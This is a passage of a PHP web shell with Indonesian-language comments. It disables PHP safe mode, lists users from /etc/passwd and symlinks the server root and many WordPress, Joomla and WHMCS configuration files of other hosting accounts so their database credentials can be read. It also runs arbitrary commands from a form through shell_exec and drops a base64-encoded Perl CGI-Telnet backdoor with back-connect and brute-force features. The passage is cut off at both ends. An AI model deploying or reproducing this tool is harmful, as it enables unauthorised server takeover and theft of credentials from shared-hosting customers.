$data = 'PD8KZWNobyBpbmlfZ2V0KCJzYWZlX21vZGUiKTsKZWNobyBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTsKaW5jbHVkZSgkR0VUWyJmaWxlIl0pOwppbmlfcmVzdG9yZSgic2FmZV9tb2RlIik7CmluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsKZWNobyBpbmlfZ2V0KCJzYWZlX21vZGUiKTsKZWNobyBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTsKaW5jbHVkZSgkX0dFVFsic3MiXSk7Cj8+';
$tulis = fwrite( $indexshell, base64_decode($data));
fclose($indexshell);
chmod("ini.php", 0755);
$safemode = fopen("php.ini" ,"w+");
$data = 'c2FmZV9tb2RlPU9GRgpkaXNhYmxlX2Z1bmN0aW9ucz1OT05F';
$tulis = fwrite( $safemode, base64_decode($data));
fclose($safemode);
   echo "<iframe src=fuck/fuck.cin width=97% height=100% frameborder=0></iframe>"; 
}
//////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'bypassconfig'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=bypassconfig" method="post">
<html>
<head>
<title>||== BypassConfig ==||</title>
<style>
body{
background: #000000;
color: #FFFFFF;
font-family:  monospace;
font-size: 12px;
}
input{
background: #0F0F0F;
border: 1px solid #00FF00;
color: #00FF00;
}
h2{
color: #55FF2A;
}
</style>
</head>
<body>
<p align="center">
<?php
echo $head ;
echo '
<table width="100%" cellspacing="0" cellpadding="0" >
<td width="100%" align=center valign="top" rowspan="1">
<font color=red size=5 face="Tahoma"><b>+--==[ Bypass</font><font color=yellow size=5 face="Tahoma"><b> Config By</font><font color=green size=5 face="Tahoma"><b> Aerul Da White-Hkc ]==--+ </font> <div>
<td height="10" align="left"></td></tr><tr><td
width="100%" align="center" valign="top" rowspan="1"><font
color="red" face="Tahoma"size="1"><b>
<font color=red>
</table>
';
?>
<body bgcolor=black><h3 style="text-align:center"><font color=red size=2 face="comic sans ms"><div align=center><table><tr><td>Selamat datang di bypass config ane gan :D <br><center>jgn lupa nitip nick ye :v</font><center></td><br></tr></table><br><br>
<form method=post><font color=white size=2 face="Tahoma">nich tombol buat php.ini :)</font><p>
<input type=submit name=ini value="use to Generate PHP.ini" /></form>
<form method=post><font color=white size=2 face="Tahoma">nich buat nyari usernamenya</font><p>
<input type=submit name="usre" value="use to Extract usernames" /></form>
<?php
if(isset($_POST['ini']))
{
$r=fopen('php.ini','w');
$rr="safe_mode=OFF
disable_functions=NONE";
fwrite($r,$rr);
$link="<a href=php.ini><font color=white size=2 face=\"Tahoma\"><u>buka di newtab PHP.INI</u></font></a>";
echo $link;
}
?>
<?php
if(isset($_POST['usre'])){
?><form method=post>
<textarea rows=10 cols=50 name=user><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}
?></textarea><br><br>
<input type=submit name=su value="mari kita mulai" /></form>
<?php } ?>
<?php
error_reporting(0);
echo "<font color=red size=2 face=\"Tahoma\">";
if(isset($_POST['su']))
{
mkdir('hkc',0777);
$rr = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$g = fopen('hkc/.htaccess','w');
fwrite($g,$rr);
$hkc = symlink("/","hkc/root");
$rt="<a href=hkc/root><font color=white size=3 face=\"Tahoma\"> OwN3d</font></a>";
echo "Mas bro buka link ini buat liat folder symlink <br><u>$rt</u>";
$dir=mkdir('hkc',0777);
$r = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$f = fopen('hkc/.htaccess','w');
fwrite($f,$r);
$consym="<a href=hkc/><font color=white size=3 face=\"Tahoma\">configuration files</font></a>";
echo "<br>CHECK HASILNYA YG DIBAWAH INI OMSSSS :*<br><u><font color=red size=2 face=\"Tahoma\">$consym</font></u>";
$usr=explode("\n",$_POST['user']);
$configuration=array("wp-config.php","wordpress/wp-config.php","configuration.php","blog/wp-config.php","joomla/configuration.php","vb/includes/config.php","includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php");
foreach($usr as $uss )
{
$us=trim($uss);
foreach($configuration as $c)
{
$rs="/home/".$us."/public_html/".$c;
$r="hkc/".$us." .. ".$c;
symlink($rs,$r);
}
}
}
?>
<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'command'))
{
echo "<b><font color=blue> </font></b><br>";
print_r('
<pre>
<form method="POST" action=""><center>
<center><b><font color=blue><b><font color="blue">Command :=) </font></font></b><input name="baba" type="text" class="inputz" size="34"><input type="submit" class="inputzbut" value="Go">
</form>
<center><form method="POST" action=""><strong><b><font color="blue">Menu Bypass :=) </font></strong><select name="liz0" size="1" class="inputz">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">netstat</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <input type="submit" class="inputzbut" value="Go">
</form>
</pre>
');
ini_restore("safe_mode");
ini_restore("open_basedir");
$liz0=shell_exec($_POST[baba]);
$liz0zim=shell_exec($_POST[liz0]);
$uid=shell_exec('id');
$server=shell_exec('uname -a');
echo "<pre><left><h4>";
echo $liz0;
echo $liz0zim;

echo "</h4><center/></pre>";
?>
<?php
}



/////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'cgi2012'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=cgi2012" method="post">
<?php
echo "<center/><br/><b>
+--==[ CGI-Telnet Version 1.3 ]==--+
</b><br><br>";
mkdir('cgi2012', 0755);
chdir('cgi2012');
$kokdosya = ".htaccess";
$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
$metin = "AddHandler cgi-script .izo";
fwrite ( $dosya , $metin ) ;
fclose ($dosya);
$cgi2012 = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluCnVzZSBNSU1FOjpCYXNlNjQ7CiRWZXJzaW9uPSAiQ0dJLVRlbG5ldCBWZXJzaW9uIDEuMyI7CiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7CgokUGFzc3dvcmQgPSAiYmFuZHVuZ2tvdGFzYW1wYWgiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4Kc3ViIElzX1dpbigpewoJJG9zID0gJnRyaW0oJEVOVnsiU0VSVkVSX1NPRlRXQVJFIn0pOwoJaWYoJG9zID1+IG0vd2luL2kpewoJCXJldHVybiAxOwoJfQoJZWxzZXsKCQlyZXR1cm4gMDsKCX0KfQokV2luTlQgPSAmSXNfV2luKCk7CQkJCSMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1ZSBvZiB0aGlzIHRvIDEgaWYKCQkJCQkJCQkjIHlvdSdyZSBydW5uaW5nIHRoaXMgc2NyaXB0IG9uIGEgV2luZG93cyBOVAoJCQkJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkJCQkJIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLgoKJE5UQ21kU2VwID0gIiYiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gV2luZG93cyBOVC4KCiRVbml4Q21kU2VwID0gIjsiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gVW5peC4KCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTAwMDA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkCgkJCQkJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMKCQkJCQkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLgoJCQkJCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMKCQkJCQkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkJIyBJZiB0aGlzIGlzIDEsIHRoZW4gZGF0YSBpcyBzZW50IHRvIHRoZQoJCQkJCQkJCSMgYnJvd3NlciBhcyBzb29uIGFzIGl0IGlzIG91dHB1dCwgb3RoZXJ3aXNlCgkJCQkJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkJCQkJIyBjb21wbGV0ZXMuIFRoaXMgaXMgdXNlZnVsIGZvciBjb21tYW5kcyBsaWtlCgkJCQkJCQkJIyBwaW5nLCBzbyB0aGF0IHlvdSBjYW4gc2VlIHRoZSBvdXRwdXQgYXMgaXQKCQkJCQkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwokY29scz0gMTUwOwokcm93cz0gMjY7CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0CiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9LgojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mCiMgdGhlIHZhcmlhYmxlLiBOb3RlOiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBDR0kKIyBzY3JpcHRzLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBSZWFkUGFyc2UgCnsKCWxvY2FsICgqaW4pID0gQF8gaWYgQF87Cglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOwoJCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsKCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQoJewoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9OwoJfQoJZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpCgl7CgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOwoJCXJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7Cgl9CgoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pCgl7CgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyAKCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyAKCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOwoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsKCQkkSGVhZGVyID0gJGA7CgkJJEJvZHkgPSAkJzsKIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5OwoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgCgkJJGlueydmJ30gPSAkMTsgCgkJJGlueydmJ30gPX4gcy9cIi8vZzsKCQkkaW57J2YnfSA9fiBzL1xzLy9nOwoKCQkjIHBhcnNlIHRyYWlsZXIKCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQoJCXsgCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOwoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87CgkJCSRrZXkgPSAkMTsKCQkJJHZhbCA9ICQnOwoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gPSAkdmFsOyAKCQl9Cgl9CgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkKCXsKCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7CgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQoJCXsKCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsKCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsKCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7CgkJCSRpbnska2V5fSAuPSAkdmFsOwoJCX0KCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcgojIEFyZ3VtZW50IDE6IEZvcm0gaXRlbSBuYW1lIHRvIHdoaWNoIGZvY3VzIHNob3VsZCBiZSBzZXQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlSGVhZGVyCnsKCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOwoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCW15ICRkaXIgPSRDdXJyZW50RGlyOwoJJGRpcj1+IHMvXFwvXFxcXC9nOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+Cjx0aXRsZT5IYWNzdWdpYTwvdGl0bGU+CgokSHRtbE1ldGFIZWFkZXIKCjwvaGVhZD4KPHN0eWxlPgpib2R5ewpmb250OiAxMHB0IFZlcmRhbmE7Cn0KdHIgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKY29sb3I6ICNmZjk5MDA7Cn0KdGQgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKY29sb3I6ICMyQkE4RUM7CmZvbnQ6IDEwcHQgVmVyZGFuYTsKfQoKdGFibGUgewpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsKQkFDS0dST1VORC1DT0xPUjogIzExMTsKfQoKCmlucHV0IHsKQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7CkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOwpmb250OiAxMHB0IFZlcmRhbmE7CmNvbG9yOiAjZmY5OTAwOwp9CgppbnB1dC5zdWJtaXQgewp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47CmNvbG9yOiAjRkZGRkZGOwpib3JkZXItY29sb3I6ICMwMDk5MDA7Cn0KCmNvZGUgewpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOwpjb2xvcjogd2hpbGU7Cn0KCnJ1biB7CmJvcmRlcgkJCTogZGFzaGVkIDBweCAjMzMzOwpmb250OiAxMHB0IFZlcmRhbmEgYm9sZDsKY29sb3I6ICNGRjAwQUE7Cn0KCnRleHRhcmVhIHsKQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7CkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7CmZvbnQ6IEZpeGVkc3lzIGJvbGQ7CmNvbG9yOiAjYWFhOwp9CkE6bGluayB7CglDT0xPUjogIzJCQThFQzsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KQTp2aXNpdGVkIHsKCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmhvdmVyIHsKCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsKCWNvbG9yOiAjZmY5OTAwOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmFjdGl2ZSB7Cgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUKfQoKLmxpc3RkaXIgdHI6aG92ZXJ7CgliYWNrZ3JvdW5kOiAjNDQ0Owp9Ci5saXN0ZGlyIHRyOmhvdmVyIHRkewoJYmFja2dyb3VuZDogIzQ0NDsKCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsKCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmU7Cn0KLm5vdGxpbmV7CgliYWNrZ3JvdW5kOiAjMTExOwp9Ci5saW5lewoJYmFja2dyb3VuZDogIzIyMjsKfQo8L3N0eWxlPgo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4KZnVuY3Rpb24gY2htb2RfZm9ybShpLGZpbGUpCnsKCS8qdmFyIGFqYXg9J2FqYXhfUG9zdERhdGEoIkZvcm1QZXJtc18nK2krJyIsIiRTY3JpcHRMb2NhdGlvbiIsIlJlc3BvbnNlRGF0YSIpOyByZXR1cm4gZmFsc2U7JzsqLwoJdmFyIGFqYXg9IiI7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZVBlcm1zXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JycgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7Cn0KZnVuY3Rpb24gcm1fY2htb2RfZm9ybShyZXNwb25zZSxpLHBlcm1zLGZpbGUpCnsKCXJlc3BvbnNlLmlubmVySFRNTCA9ICI8c3BhbiBvbmNsaWNrPVxcXCJjaG1vZF9mb3JtKCIgKyBpICsgIiwnIisgZmlsZSsgIicpXFxcIiA+IisgcGVybXMgKyI8L3NwYW4+PC90ZD4iOwp9CmZ1bmN0aW9uIHJlbmFtZV9mb3JtKGksZmlsZSxmKQp7Cgl2YXIgYWpheD0iIjsKCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOwoJdmFyIGJhY2s9InJtX3JlbmFtZV9mb3JtKCIraSsiLFxcXCIiK2ZpbGUrIlxcXCIsXFxcIiIrZisiXFxcIik7IHJldHVybiBmYWxzZTsiOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nJyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1yZW5hbWUgdHlwZT10ZXh0IHZhbHVlPSAnIitmaWxlKyInIC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBhamF4ICsgIicgdmFsdWU9T0s+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBiYWNrICsgIicgdmFsdWU9Q2FuY2VsPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7Cn0KZnVuY3Rpb24gcm1fcmVuYW1lX2Zvcm0oaSxmaWxlLGYpCnsKCWlmKGY9PSdmJykKCXsKCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Y29tbWFuZCZkPSRkaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsKCX1lbHNlCgl7CgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOwoJfQp9Cjwvc2NyaXB0Pgo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzBjMGMwYyIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4KPGNlbnRlcj48Y29kZT4KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+Cjx0cj4KCTx0ZCBhbGlnbj0iY2VudGVyIiByb3dzcGFuPTI+CgkJPGI+PGZvbnQgc2l6ZT0iNSI+JEVkaXRQZXJzaW9uPC9mb250PjwvYj4KCTwvdGQ+CgoJPHRkPgoKCQk8Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4kRU5WeyJTRVJWRVJfU09GVFdBUkUifTwvZm9udD4KCTwvdGQ+Cgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSIjY2MwMDAwIj4gJEVOVnsnU0VSVkVSX0FERFInfTwvZm9udD4gfCBZb3VyIElQOiA8Zm9udCBjb2xvcj0iIzAwMDAwMCI+JEVOVnsnUkVNT1RFX0FERFInfTwvZm9udD4KCTwvdGQ+Cgo8L3RyPgoKPHRyPgo8dGQgY29sc3Bhbj0iMyI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbiI+SG9tZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y29tbWFuZCZkPSRFbmNvZGVkQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1ndWkmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkdVSTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1icnV0ZWZvcmNlciI+QnJ1dGUgRm9yY2VyPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNoZWNrbG9nIj5DaGVjayBMb2c8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG9tYWluc3VzZXIiPkRvbWFpbnMvVXNlcnM8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5Mb2dvdXQ8L2E+IHwKPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9IiMiPkhlbHA8L2E+Cgo8L2ZvbnQ+PC90ZD4KPC90cj4KPC90YWJsZ